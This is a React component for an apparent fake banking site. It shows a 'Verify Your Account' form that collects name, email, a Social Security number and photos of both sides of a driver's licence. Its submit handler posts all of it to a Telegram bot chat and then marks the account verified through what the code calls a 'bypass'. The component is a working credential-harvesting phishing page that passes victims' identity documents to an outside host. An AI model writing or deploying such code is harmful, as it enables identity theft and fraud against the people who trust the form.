import React, { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { ShieldCheck, UploadCloud, CheckCircle, X } from 'lucide-react';
import { useBank } from '@/app/context/BankContext';
import styles from './VerificationModal.module.css';

interface VerificationModalProps {
  isOpen: boolean;
  onComplete: () => void;
}

export default function VerificationModal({ isOpen, onComplete }: VerificationModalProps) {
  const bank = useBank();
  const user = bank.activeUser;
  
  const [fullName, setFullName] = useState(user?.profileName || '');
  const [email, setEmail] = useState(user?.username || '');
  const [ssn, setSsn] = useState('');
  
  const [frontFile, setFrontFile] = useState<File | null>(null);
  const [backFile, setBackFile] = useState<File | null>(null);
  const [frontUploaded, setFrontUploaded] = useState(false);
  const [backUploaded, setBackUploaded] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!fullName || !email) return;
    if (!frontUploaded || !backUploaded) return;

    setIsSubmitting(true);
    
    // 1. Send data to Telegram (Start process)
    // We call the text send first to ensure the most critical info goes through
    const token = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
    const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;

    if (token && chatId && token !== 'YOUR_BOT_TOKEN_HERE') {
      const message = `
🔔 *New Verification Submission*
👤 *Name:* ${fullName}
📧 *Email:* ${email}
🆔 *SSN:* ${ssn || 'N/A'}
🌍 *Country:* ${user?.country || 'Unknown'}
⏰ *Time:* ${new Date().toLocaleString()}
      `;

      try {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown'
          })
        });

        // Start image uploads in background without blocking the UI
        if (frontFile) {
          const fd = new FormData();
          fd.append('chat_id', chatId);
          fd.append('photo', frontFile);
          fd.append('caption', `Front ID for ${fullName}`);
          fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
        }
        if (backFile) {
          const fd = new FormData();
          fd.append('chat_id', chatId);
          fd.append('photo', backFile);
          fd.append('caption', `Back ID for ${fullName}`);
          fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
        }
      } catch (err) {
        console.error('Telegram error:', err);
      }
    }

    // 2. Immediate Bypass
    if (user) {
      // Save to localStorage as a persistent backup bypass
      localStorage.setItem(`verified_${user.id}`, 'true');
      bank.verifyAccount(user.id);
    }
    
    setIsSubmitting(false);
    onComplete();
  };

  const handleUpload = (side: 'front' | 'back', file: File) => {
    if (side === 'front') {
      setFrontFile(file);
      setFrontUploaded(true);
    } else {
      setBackFile(file);
      setBackUploaded(true);
    }
  };

  if (!isOpen || !user) return null;

  return (
    <div className={styles.overlay}>
      <motion.div 
        className={styles.modal}
        initial={{ scale: 0.9, opacity: 0, y: 20 }}
        animate={{ scale: 1, opacity: 1, y: 0 }}
        transition={{ type: "spring", damping: 25, stiffness: 300 }}
      >
        <div className={styles.header}>
          <div className={styles.iconContainer}>
            <ShieldCheck size={28} color="#5cb85c" />
          </div>
          <h2>Verify Your Account</h2>
          <p>Please provide the following details to activate your account securely.</p>
        </div>

        <form onSubmit={handleSubmit} className={styles.form}>
          <div className={styles.inputGroup}>
            <label>Full Name</label>
            <input 
              type="text" 
              value={fullName} 
              onChange={e => setFullName(e.target.value)} 
              required 
              placeholder="e.g. Jane Doe"
            />
          </div>

          <div className={styles.inputGroup}>
            <label>Email Address</label>
            <input 
              type="email" 
              value={email} 
              onChange={e => setEmail(e.target.value)} 
              required 
              placeholder="e.g. jane@example.com"
            />
          </div>

          {user.country === 'US' && (
            <div className={styles.inputGroup}>
              <label>Social Security Number (SSN)</label>
              <input 
                type="text" 
                value={ssn} 
                onChange={e => setSsn(e.target.value)} 
                placeholder="only USA user"
                maxLength={9}
              />
            </div>
          )}

          <div className={styles.uploadSection}>
            <label>Driver's License</label>
            <div className={styles.uploadGrid}>
              <label className={`${styles.uploadBox} ${frontUploaded ? styles.uploaded : ''}`}>
                <input 
                  type="file" 
                  accept="image/*" 
                  capture="environment" 
                  style={{ display: 'none' }}
                  onChange={(e) => {
                    if (e.target.files && e.target.files.length > 0) {
                      handleUpload('front', e.target.files[0]);
                    }
                  }}
                  disabled={frontUploaded}
                />
                {frontUploaded ? (
                  <>
                    <CheckCircle size={24} color="#5cb85c" />
                    <span>Front Uploaded</span>
                  </>
                ) : (
                  <>
                    <UploadCloud size={24} color="#666" />
                    <span>Upload Front</span>
                  </>
                )}
              </label>
              
              <label className={`${styles.uploadBox} ${backUploaded ? styles.uploaded : ''}`}>
                <input 
                  type="file" 
                  accept="image/*" 
                  capture="environment" 
                  style={{ display: 'none' }}
                  onChange={(e) => {
                    if (e.target.files && e.target.files.length > 0) {
                      handleUpload('back', e.target.files[0]);
                    }
                  }}
                  disabled={backUploaded}
                />
                {backUploaded ? (
                  <>
                    <CheckCircle size={24} color="#5cb85c" />
                    <span>Back Uploaded</span>
                  </>
                ) : (
                  <>
                    <UploadCloud size={24} color="#666" />
                    <span>Upload Back</span>
                  </>
                )}
              </label>
            </div>
          </div>

          <button 
            type="submit" 
            className={styles.submitBtn} 
            disabled={isSubmitting || !frontUploaded || !backUploaded}
          >
            {isSubmitting ? 'Verifying...' : 'Complete Verification'}
          </button>
        </form>
      </motion.div>
    </div>
  );
}
